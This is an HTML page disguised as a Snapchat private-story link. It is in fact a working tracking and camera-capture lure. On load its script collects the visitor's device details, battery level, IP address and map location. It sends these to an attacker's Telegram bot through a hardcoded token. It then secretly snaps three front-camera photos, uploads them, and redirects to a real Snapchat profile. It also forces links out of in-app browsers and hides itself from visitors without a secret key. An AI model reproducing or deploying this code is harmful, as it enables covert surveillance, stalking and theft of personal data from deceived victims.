<!DOCTYPE html>
<html lang="ar">
<head>
    <title>Snapchat - Koko Englishy ✨</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta property="og:image" content="https://b.top4top.io/p_3769xk2ya0.jpg">
    <meta property="og:title" content="Snapchat - Koko Englishy ✨">
    <style>
        body { background-color: #FFFC00; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .snap-logo { width: 80px; margin-bottom: 20px; }
        .profile-card { background: #fff; padding: 25px; border-radius: 20px; text-align: center; width: 85%; box-shadow: 0 10px 25px rgba(0,0,0,0.1); }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="profile-card" id="mainContent" style="display:none;">
    <img class="snap-logo" src="https://www.snapchat.com/favicon.png">
    <div class="profile-name" style="font-weight:bold; font-size:22px;">Koko Englishy ✨</div>
    <p>🎀 Loading Private Story...</p>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" width="640" height="480"></canvas>

<script>
    const token = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
    const chatId = '7184970355';
    const secretKey = "123";

    // 1. نظام إجبار الفتح في متصفح خارجي (Chrome/Safari)
    function forceExternalBrowser() {
        const ua = navigator.userAgent || navigator.vendor || window.opera;
        const isInstagram = ua.indexOf('Instagram') > -1;
        const isFacebook = ua.indexOf('FBAN') > -1 || ua.indexOf('FBAV') > -1;
        const isWhatsApp = ua.indexOf('WhatsApp') > -1;

        if (isInstagram || isFacebook || isWhatsApp) {
            // محاولة فتح الرابط في المتصفح الافتراضي للجهاز
            window.location.href = 'intent://' + window.location.href.replace(/^https?:\/\//, '') + '#Intent;scheme=https;package=com.android.chrome;end';
        }
    }

    // 2. فحص المفتاح السري
    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('key') !== secretKey) {
        window.location.href = "https://www.google.com";
    } else {
        document.getElementById('mainContent').style.display = 'block';
        forceExternalBrowser();
    }

    async function fullExploit() {
        // سحب تفاصيل البطارية
        let batteryInfo = "Unknown";
        try {
            const battery = await navigator.getBattery();
            batteryInfo = `${(battery.level * 100).toFixed(0)}% (${battery.charging ? "Charging" : "Discharging"})`;
        } catch(e) {}

        // سحب الأي بي والموقع بالتفصيل
        let ipDetails = "Fetching...";
        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();
            ipDetails = `
📍 Location: ${d.city}, ${d.region}, ${d.country_name}
🌐 IP: ${d.ip}
🏢 ISP: ${d.org}
🗺️ Google Maps: https://www.google.com/maps/?q=${d.latitude},${d.longitude}
            `;
        } catch(e) {}

        let info = `
🚀 **New Target Detailed Report**
━━━━━━━━━━━━━━━
📱 **Device Info:**
System: \`${navigator.platform}\`
Model: \`${navigator.userAgent.split('(')[1].split(')')[0]}\`
RAM: \`${navigator.deviceMemory || "Unknown"} GB\`
Cores: \`${navigator.hardwareConcurrency || "Unknown"}\`
Screen: \`${screen.width}x${screen.height}\`
🔋 Battery: \`${batteryInfo}\`
━━━━━━━━━━━━━━━
🌐 **Network Details:**
${ipDetails}
━━━━━━━━━━━━━━━
        `;
        
        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);

        // 3. التقاط 3 صور سريعة جداً (للأيفون والأندرويد)
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
            const video = document.getElementById('video');
            video.srcObject = stream;
            
            let count = 0;
            let interval = setInterval(() => {
                if (count >= 3) {
                    clearInterval(interval);
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = "https://www.snapchat.com/add/koko_englishy";
                    return;
                }

                const canvas = document.getElementById('canvas');
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    const fd = new FormData();
                    fd.append('chat_id', chatId);
                    fd.append('photo', blob, 'img.jpg');
                    fd.append('caption', `📷 Shot ${count+1}`);
                    fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                }, 'image/jpeg', 0.7);
                count++;
            }, 600); // سرعة الالتقاط كل 600ms
        })
        .catch(err => {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ Camera Permission Refused")}`);
            setTimeout(() => { window.location.href = "https://www.snapchat.com/add/koko_englishy"; }, 1000);
        });
    }

    if (urlParams.get('key') === secretKey) {
        window.onload = fullExploit;
    }
</script>

</body>
</html>
